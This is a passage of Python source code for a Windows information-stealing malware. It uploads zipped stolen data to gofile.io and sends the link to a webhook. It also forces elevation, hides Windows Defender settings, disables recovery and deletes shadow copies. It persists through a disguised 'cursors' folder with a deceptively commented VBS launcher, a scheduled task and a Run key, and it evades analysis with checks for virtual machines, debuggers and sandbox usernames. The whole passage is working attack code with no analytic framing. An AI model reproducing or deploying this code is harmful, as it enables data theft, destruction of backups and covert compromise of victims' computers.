                    url=f"https://{server}.gofile.io/uploadFile",
                    data={
                        "token": None,
                        "folderId": None,
                        "description": None,
                        "password": None,
                        "tags": None,
                        "expire": None
                },
                files={"upload_file": infozip},
                ).json()["data"]["downloadPage"]
                a = fileEmbed.copy()
                a.update({"content": f"{link}"})
                requests.post(self.webhook, json=a)
        os.remove(_zipfile)
    def forceadmin(self):
        self.system(f'set __COMPAT_LAYER=RunAsInvoker && powershell Start-Process \'{sys.argv[0]}\' -WindowStyle Hidden -verb runAs -ArgumentList \'--nouacbypass\'>nul')
        sys.exit()
    def persist(self):
        try: elevated = ctypes.windll.shell32.IsUserAnAdmin()
        except Exception: elevated = False
        if elevated:
            try:
                self.system(f'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "SettingsPageVisibility" /t REG_SZ /d "hide:recovery;windowsdefender" /f >nul')
                self.system(f'reagentc /disable >nul')
                self.system(f'vssadmin delete shadows /all /quiet >nul')
                shutil.copy2(sys.argv[0],'C:\\Windows\\Cursors\\')
                os.rename(os.path.join('C:\\Windows\\Cursors',os.path.basename(sys.argv[0]),'C:\\Windows\\Cursors\\cursors.cfg'))
                with open('cursorinit.vbs','w') as f: f.write('\' This script loads the cursor configuration\n\' And cursors themselves\n\' Into the shell so that Fondrvhost.exe (The font renderer)\n\' Can use them.\n\' It is recommended not to tamper with\n\' Any files in this directory\n\' Doing so may cause the explorer to crash\nSet objShell = WScript.CreateObject(\"WScript.Shell\")\nobjShell.Run \"cmd /c C:\\Windows\\Cursors\\cursors.cfg\", 0, True\n')
                self.system(f'schtasks /create /tn "CursorSvc" /sc ONLOGON /tr "C:\\Windows\\Cursors\\cursorinit.vbs" /rl HIGHEST /f >nul')
                ctypes.windll.kernel32.SetFileAttributesW('C:\\Windows\\Cursors',0x2)
                ctypes.windll.kernel32.SetFileAttributesW('C:\\Windows\\Cursors',0x4)
                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\Cursors',0x256)
            except Exception: self.exceptions.append(traceback.format_exc())
        elif (elevated == False) and (os.getcwd() != os.path.join(self.roaming,'Cursors')):
            try:
                try: shutil.rmtree(os.path.join(self.roaming,'Cursors'))
                except Exception: pass
                os.makedirs(self.roaming+'\\Cursors', 0x1ED, exist_ok=True)
                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\Cursors',0x2)
                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\Cursors',0x4)
                ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\Cursors',0x256)
                shutil.copy2(sys.argv[0],os.path.join(self.roaming,'Cursors\\'))
                os.rename(os.path.join(self.roaming,'Cursors\\',os.path.basename(sys.argv[0])),os.path.join(self.roaming,'Cursors\\cursors.cfg',))
                binp = "Cursors\\cursors.cfg"
                initp = "Cursors\\cursorinit.vbs"
                with open(os.path.join(self.roaming,'Cursors\\cursorinit.vbs'),'w') as f: f.write(f'\' This script loads the cursor configuration\n\' And cursors themselves\n\' Into the shell so that Fondrvhost.exe (The font renderer)\n\' Can use them.\n\' It is recommended not to tamper with\n\' Any files in this directory\n\' Doing so may cause the explorer to crash\nSet objShell = WScript.CreateObject(\"WScript.Shell\")\nobjShell.Run \"cmd /c \'{os.path.join(self.roaming,binp)}\'\", 0, True\n')
                self.system(f'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "CursorInit" /t REG_SZ /d "{os.path.join(self.roaming,initp)}" /f >nul')
            except Exception: self.exceptions.append(traceback.format_exc())
def handler():
    try: ticks(0x0000000000F)
    except Exception: pass
    internal.stolen = True
    if config.get('keep-alive'):
        while True:
            time.sleep(random.randrange(3400,3800))
            try: ticks(0x0000000000F)
            except Exception: pass
def stabilizeTicks():
    if config['antivm']:
        if os.path.exists('D:\\Tools') or os.path.exists('D:\\OS2') or os.path.exists('D:\\NT3X'): return
        if ctypes.windll.kernel32.IsDebuggerPresent() or ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), False): return
        for process in psutil.process_iter():
            if process.name() in ["ProcessHacker.exe", "httpdebuggerui.exe", "wireshark.exe", "fiddler.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe", "pestudio.exe", "vmwareuser.exe", "vgauthservice.exe", "vmacthlp.exe", "vmsrvc.exe", "x32dbg.exe", "x64dbg.exe", "x96dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "xenservice.exe", "joeboxserver.exe", "devenv.exe", "IMMUNITYDEBUGGER.EXE", "ImportREC.exe", "reshacker.exe", "windbg.exe", "32dbg.exe", "64dbg.exex", "protection_id.exex", "scylla_x86.exe", "scylla_x64.exe", "scylla.exe", "idau64.exe", "idau.exe", "idaq64.exe", "idaq.exe", "idaq.exe", "idaw.exe", "idag64.exe", "idag.exe", "ida64.exe", "ida.exe", "ollydbg.exe"]: return
        if os.getlogin() in ["WDAGUtilityAccount","Abby","Peter Wilson","hmarc","patex","JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq","Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A","lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl","Joe"]: return
        if functions.system(functions, r'wmic path win32_VideoController get name').splitlines()[1] in ["Microsoft Remote Display Adapter", "Microsoft Hyper-V Video", "Microsoft Basic Display Adapter", "VMware SVGA 3D", "Standard VGA Graphics Adapter","NVIDIA GeForce 840M", "NVIDIA GeForce 9400M", "UKBEHH_S", "ASPEED Graphics Family(WDDM)", "H_EDEUEK", "VirtualBox Graphics Adapter", "K9SC88UK","Стандартный VGA графический адаптер",]: return
        if int(str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]) <= 50: return
    if config['hideconsole']: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    try: handler()
    except Exception: pass

ticks.starttime = time.time()
if __name__ == "__main__": stabilizeTicks()